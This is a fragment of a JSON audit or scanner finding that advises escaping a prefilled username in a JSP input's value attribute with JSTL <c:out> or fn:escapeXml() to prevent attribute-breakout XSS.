            "remediationSummary": "Use &lt;c:out&gt; or fn:escapeXml() on ${prefillUsername} used in the input value attribute to prevent attribute-breakout XSS.",
            "remediation": "Replace the bare EL expression in the `value` attribute with JSTL `<c:out>` (which also works in attribute position) or the `fn:escapeXml()` function:\n\n```jsp\n<input name=\"username\" class=\"input is-large\" type=\"text\"\n       placeholder=\"Username\" autofocus=\"\"\n       value=\"<c:out value='${prefillUsername}'/>\">\n```\nOr, equivalently:\n```jsp\nvalue=\"${fn:escapeXml(prefillUsername)}\"\n```"
